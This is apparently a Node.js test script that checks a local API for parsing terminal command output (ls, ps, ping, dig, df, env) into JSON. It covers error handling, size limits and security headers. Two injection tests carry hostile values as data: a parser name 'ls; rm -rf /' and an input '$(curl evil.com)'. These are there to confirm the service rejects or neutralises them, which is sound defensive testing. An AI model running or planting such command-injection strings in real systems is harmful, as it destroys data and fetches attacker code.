const baseUrl = process.env.BASE_URL ?? "http://127.0.0.1:3000";

const lsInput = `total 48
drwxr-xr-x  6 user user 4096 Apr  1 10:00 .
drwxr-xr-x 20 user user 4096 Apr  1 09:00 ..
-rw-r--r--  1 user user 1234 Apr  1 10:00 README.md
-rwxr-xr-x  1 user user 5678 Apr  1 10:00 script.sh
drwxr-xr-x  2 user user 4096 Apr  1 10:00 src`;

const psInput = `USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1 225344  9000 ?        Ss   09:00   0:01 /sbin/init
user      1234  0.5  2.3 512000 45000 pts/0    Sl   09:30   0:45 node server.js
root      5678  0.0  0.0  14224  1024 ?        S    09:00   0:00 /sbin/syslogd`;

const pingInput = `PING google.com (142.250.80.46) 56(84) bytes of data.
64 bytes from lga34s32-in-f14.1e100.net (142.250.80.46): icmp_seq=1 ttl=116 time=12.3 ms
64 bytes from lga34s32-in-f14.1e100.net (142.250.80.46): icmp_seq=2 ttl=116 time=11.8 ms
64 bytes from lga34s32-in-f14.1e100.net (142.250.80.46): icmp_seq=3 ttl=116 time=12.1 ms
--- google.com ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 11.8/12.07/12.3/0.204 ms`;

const dfInput = `Filesystem     1K-blocks    Used Available Use% Mounted on
udev             4017528       0   4017528   0% /dev
tmpfs             806152    1896    804256   1% /run
/dev/sda1      102400000 5120000  92160000   6% /
tmpfs            4030760       0   4030760   0% /dev/shm`;

const envInput = `HOME=/home/user
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SHELL=/bin/bash
USER=user
LANG=en_US.UTF-8
TERM=xterm-256color`;

const digInput = `; <<>> DiG 9.16.1-Ubuntu <<>> google.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 12345
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
;; QUESTION SECTION:
;google.com.                    IN      A
;; ANSWER SECTION:
google.com.             299     IN      A       142.250.80.46
;; Query time: 23 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Mon Apr 01 10:00:00 UTC 2024
;; MSG SIZE  rcvd: 55`;

const largeLsInput = Array.from(
  { length: 5000 },
  (_, index) =>
    `-rw-r--r-- 1 user user ${1000 + index} Apr  1 10:${String(index % 60).padStart(2, "0")} file-${index}.txt`,
).join("\n");

async function request(path, options = {}, timeoutMs = 20_000) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), timeoutMs);

  try {
    const response = await fetch(`${baseUrl}${path}`, {
      ...options,
      signal: controller.signal,
    });
    const text = await response.text();
    let body = null;

    if (text) {
      try {
        body = JSON.parse(text);
      } catch {
        body = text;
      }
    }

    return { response, body };
  } finally {
    clearTimeout(timeout);
  }
}

function summarize(value) {
  const text =
    typeof value === "string" ? value : JSON.stringify(value, null, 0);
  return text.length > 320 ? `${text.slice(0, 320)}...` : text;
}

function has(obj, key) {
  return Boolean(obj && typeof obj === "object" && key in obj);
}

function asParseSuccess(body) {
  return body && typeof body === "object" && body.success === true ? body : null;
}

const tests = [
  {
    id: "P1",
    input: "GET /api/parsers",
    expected:
      "Array with 50+ parsers, each having { slug: string, description: string }",
    run: async () => {
      const { response, body } = await request("/api/parsers");
      const pass =
        response.ok &&
        Array.isArray(body) &&
        body.length > 50 &&
        body.every(
          (entry) =>
            typeof entry?.slug === "string" &&
            typeof entry?.description === "string",
        );
      return {
        pass,
        actual: `status=${response.status}; length=${Array.isArray(body) ? body.length : "n/a"}`,
      };
    },
  },
  {
    id: "P2",
    input: "GET /api/parsers",
    expected:
      'Slugs include "ls", "ps", "ping", "dig", "netstat", "ifconfig", "df", "du", "env"',
    run: async () => {
      const { response, body } = await request("/api/parsers");
      const slugs = Array.isArray(body) ? body.map((entry) => entry.slug) : [];
      const required = ["ls", "ps", "ping", "dig", "netstat", "ifconfig", "df", "du", "env"];
      const missing = required.filter((slug) => !slugs.includes(slug));
      return {
        pass: response.ok && missing.length === 0,
        actual: `status=${response.status}; missing=${missing.join(",") || "none"}`,
      };
    },
  },
  {
    id: "C1",
    input: "parser=ls",
    expected:
      "Array of objects with filename, permissions, owner, size, date fields",
    run: async () => {
      const { response, body } = await request("/api/parse", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ parser: "ls", input: lsInput }),
      });
      const success = asParseSuccess(body);
      const record = Array.isArray(success?.data)
        ? success.data.find((entry) => entry.filename === "README.md")
        : null;
      const pass =
        response.ok &&
        Boolean(record) &&
        has(record, "filename") &&
        (has(record, "permissions") || has(record, "flags")) &&
        has(record, "owner") &&
        has(record, "size") &&
        has(record, "date");
      return { pass, actual: summarize(record ?? body) };
    },
  },
  {
    id: "C2",
    input: "parser=ps",
    expected:
      "Array of process objects with pid, user, cpu, mem, command fields",
    run: async () => {
      const { response, body } = await request("/api/parse", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ parser: "ps", input: psInput }),
      });
      const success = asParseSuccess(body);
      const record = Array.isArray(success?.data)
        ? success.data.find((entry) => entry.pid === 1234)
        : null;
      const pass =
        response.ok &&
        Boolean(record) &&
        has(record, "pid") &&
        has(record, "user") &&
        (has(record, "cpu") || has(record, "cpu_percent")) &&
        (has(record, "mem") || has(record, "mem_percent")) &&
        has(record, "command");
      return { pass, actual: summarize(record ?? body) };
    },
  },
  {
    id: "C3",
    input: "parser=ping",
    expected:
      "Object with destination, packets_transmitted, packets_received, packet_loss, rtt fields",
    run: async () => {
      const { response, body } = await request("/api/parse", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ parser: "ping", input: pingInput }),
      });
      const success = asParseSuccess(body);
      const record = success?.data;
      const hasRtt =
        has(record, "rtt") ||
        has(record, "round_trip_ms") ||
        (has(record, "round_trip_ms_min") &&
          has(record, "round_trip_ms_avg") &&
          has(record, "round_trip_ms_max"));
      const pass =
        response.ok &&
        Boolean(record) &&
        has(record, "destination") &&
        has(record, "packets_transmitted") &&
        has(record, "packets_received") &&
        (has(record, "packet_loss") || has(record, "packet_loss_percent")) &&
        hasRtt;
      return { pass, actual: summarize(record ?? body) };
    },
  },
  {
    id: "C4",
    input: "parser=df",
    expected:
      "Array of filesystem objects with filesystem, size, used, available, capacity, mount fields",
    run: async () => {
      const { response, body } = await request("/api/parse", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ parser: "df", input: dfInput }),
      });
      const success = asParseSuccess(body);
      const record = Array.isArray(success?.data)
        ? success.data.find((entry) => entry.filesystem === "/dev/sda1")
        : null;
      const pass =
        response.ok &&
        Boolean(record) &&
        has(record, "filesystem") &&
        (has(record, "size") || has(record, "1k_blocks") || has(record, "512_blocks")) &&
        has(record, "used") &&
        has(record, "available") &&
        (has(record, "capacity") || has(record, "capacity_percent") || has(record, "use_percent")) &&
        (has(record, "mount") || has(record, "mounted_on"));
      return { pass, actual: summarize(record ?? body) };
    },
  },
  {
    id: "C5",
    input: "parser=env",
    expected: "Array or object containing key-value pairs for each env variable",
    run: async () => {
      const { response, body } = await request("/api/parse", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ parser: "env", input: envInput }),
      });
      const success = asParseSuccess(body);
      const record = success?.data;
      const pass =
        response.ok &&
        ((Array.isArray(record) &&
          record.some((entry) => entry.name === "HOME" && entry.value === "/home/user")) ||
          (record && typeof record === "object" && record.HOME === "/home/user"));
      return { pass, actual: summarize(record ?? body) };
    },
  },
  {
    id: "C6",
    input: "parser=dig",
    expected:
      "Structured DNS response object with question, answer, header sections",
    run: async () => {
      const { response, body } = await request("/api/parse", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ parser: "dig", input: digInput }),
      });
      const success = asParseSuccess(body);
      const record = Array.isArray(success?.data) ? success.data[0] : success?.data;
      const hasHeader =
        has(record, "header") || (has(record, "id") && has(record, "opcode") && has(record, "status"));
      const pass =
        response.ok &&
        Boolean(record) &&
        hasHeader &&
        has(record, "question") &&
        has(record, "answer");
      return { pass, actual: summarize(record ?? body) };
    },
  },
  {
    id: "E1",
    input: 'POST /api/parse { parser: "ls", input: "" }',
    expected: '{ success: false, error: "..." } with HTTP 400',
    run: async () => {
      const { response, body } = await request("/api/parse", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ parser: "ls", input: "" }),
      });
      return {
        pass: response.status === 400 && body?.success === false && typeof body?.error === "string",
        actual: summarize({ status: response.status, body }),
      };
    },
  },
  {
    id: "E2",
    input: 'POST /api/parse { parser: "notaparser", input: "some output" }',
    expected: '{ success: false, error: "..." } with HTTP 400',
    run: async () => {
      const { response, body } = await request("/api/parse", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ parser: "notaparser", input: "some output" }),
      });
      return {
        pass: response.status === 400 && body?.success === false && typeof body?.error === "string",
        actual: summarize({ status: response.status, body }),
      };
    },
  },
  {
    id: "E3",
    input: 'POST /api/parse { parser: "ls; rm -rf /", input: "test" }',
    expected: "Rejected at validation, never reaches subprocess",
    run: async () => {
      const { response, body } = await request("/api/parse", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ parser: "ls; rm -rf /", input: "test" }),
      });
      return {
        pass: response.status === 400 && body?.success === false,
        actual: summarize({ status: response.status, body }),
      };
    },
  },
  {
    id: "E4",
    input: 'POST /api/parse { parser: "ls", input: "$(curl evil.com)" }',
    expected: "Treated as literal text and handled safely",
    run: async () => {
      const { response, body } = await request("/api/parse", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ parser: "ls", input: "$(curl evil.com)" }),
      });
      return {
        pass: response.status < 500 && typeof body?.success === "boolean",
        actual: summarize({ status: response.status, body }),
      };
    },
  },
  {
    id: "E5",
    input: 'POST /api/parse { parser: "ls", input: "<5000 lines>" }',
    expected:
      "Either parses successfully or returns a clean error, does NOT hang or crash",
    run: async () => {
      const startedAt = Date.now();
      const { response, body } = await request(
        "/api/parse",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ parser: "ls", input: largeLsInput }),
        },
        25_000,
      );
      return {
        pass:
          Date.now() - startedAt < 25_000 &&
          response.status < 500 &&
          typeof body?.success === "boolean",
        actual: summarize({
          status: response.status,
          elapsedMs: Date.now() - startedAt,
          success: body?.success,
          length: Array.isArray(body?.data) ? body.data.length : null,
          error: body?.error,
        }),
      };
    },
  },
  {
    id: "E6",
    input: "GET /api/parse",
    expected: "405 Method Not Allowed",
    run: async () => {
      const { response, body } = await request("/api/parse");
      return {
        pass: response.status === 405,
        actual: summarize({ status: response.status, body }),
      };
    },
  },
  {
    id: "E7",
    input: 'POST /api/parse { input: "some output" }',
    expected: "HTTP 400 with clear error",
    run: async () => {
      const { response, body } = await request("/api/parse", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ input: "some output" }),
      });
      return {
        pass:
          response.status === 400 &&
          body?.success === false &&
          typeof body?.error === "string" &&
          /format/i.test(body.error),
        actual: summarize({ status: response.status, body }),
      };
    },
  },
  {
    id: "E8",
    input: 'POST /api/parse { parser: "ls" }',
    expected: "HTTP 400 with clear error",
    run: async () => {
      const { response, body } = await request("/api/parse", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ parser: "ls" }),
      });
      return {
        pass:
          response.status === 400 &&
          body?.success === false &&
          typeof body?.error === "string" &&
          /(terminal output|output)/i.test(body.error),
        actual: summarize({ status: response.status, body }),
      };
    },
  },
  {
    id: "E9",
    input: 'POST /api/parse text/plain body "hello"',
    expected: "HTTP 400 or 415, not a crash",
    run: async () => {
      const { response, body } = await request("/api/parse", {
        method: "POST",
        headers: { "Content-Type": "text/plain" },
        body: "hello",
      });
      return {
        pass: response.status === 400 || response.status === 415,
        actual: summarize({ status: response.status, body }),
      };
    },
  },
  {
    id: "S1",
    input: "GET /api/parsers headers",
    expected:
      "No X-Powered-By header, public cache header, and defensive response headers present",
    run: async () => {
      const { response } = await request("/api/parsers");
      const cacheControl = response.headers.get("cache-control");
      return {
        pass:
          response.status === 200 &&
          !response.headers.has("x-powered-by") &&
          cacheControl?.includes("public") &&
          response.headers.get("x-content-type-options") === "nosniff" &&
          response.headers.get("x-frame-options") === "DENY",
        actual: summarize({
          status: response.status,
          cacheControl,
          xPoweredBy: response.headers.get("x-powered-by"),
          xContentTypeOptions: response.headers.get("x-content-type-options"),
          xFrameOptions: response.headers.get("x-frame-options"),
        }),
      };
    },
  },
  {
    id: "S2",
    input: "PUT /api/parse",
    expected: "JSON 405 response with Allow header",
    run: async () => {
      const { response, body } = await request("/api/parse", {
        method: "PUT",
      });
      return {
        pass:
          response.status === 405 &&
          body?.success === false &&
          response.headers.get("allow") === "POST, OPTIONS",
        actual: summarize({
          status: response.status,
          allow: response.headers.get("allow"),
          body,
        }),
      };
    },
  },
  {
    id: "S3",
    input: "OPTIONS /api/parsers",
    expected: "204 response advertising only GET, HEAD, OPTIONS",
    run: async () => {
      const { response, body } = await request("/api/parsers", {
        method: "OPTIONS",
      });
      return {
        pass:
          response.status === 204 &&
          response.headers.get("allow") === "GET, HEAD, OPTIONS" &&
          body === null,
        actual: summarize({
          status: response.status,
          allow: response.headers.get("allow"),
          body,
        }),
      };
    },
  },
  {
    id: "S4",
    input: 'POST /api/parse invalid JSON body "{"',
    expected: "HTTP 400 bad_request with PRD JSON message and no stack trace leakage",
    run: async () => {
      const { response, body } = await request("/api/parse", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: "{",
      });
      return {
        pass:
          response.status === 400 &&
          body?.success === false &&
          body?.code === "bad_request" &&
          body?.error === "Request body must be valid JSON." &&
          !/stack|SyntaxError|at /i.test(body.error),
        actual: summarize({ status: response.status, body }),
      };
    },
  },
  {
    id: "S5",
    input: "POST /api/parse body > 600 KB (PRD limit)",
    expected: "HTTP 413 payload_too_large before the server crashes or hangs",
    run: async () => {
      const oversizeBody = JSON.stringify({
        parser: "ls",
        input: "x".repeat(700_000),
      });
      const { response, body } = await request(
        "/api/parse",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: oversizeBody,
        },
        25_000,
      );
      return {
        pass:
          response.status === 413 &&
          body?.success === false &&
          body?.code === "payload_too_large",
        actual: summarize({ status: response.status, body }),
      };
    },
  },
];

const results = [];

for (const test of tests) {
  try {
    const result = await test.run();
    results.push({
      id: test.id,
      input: test.input,
      expected: test.expected,
      actual: result.actual,
      status: result.pass ? "PASS" : "FAIL",
    });
  } catch (error) {
    results.push({
      id: test.id,
      input: test.input,
      expected: test.expected,
      actual: error instanceof Error ? error.message : String(error),
      status: "FAIL",
    });
  }
}

const passed = results.filter((result) => result.status === "PASS").length;
const summary = {
  baseUrl,
  total: results.length,
  passed,
  failed: results.length - passed,
  results,
};

console.log(JSON.stringify(summary, null, 2));

if (summary.failed > 0) {
  process.exitCode = 1;
}
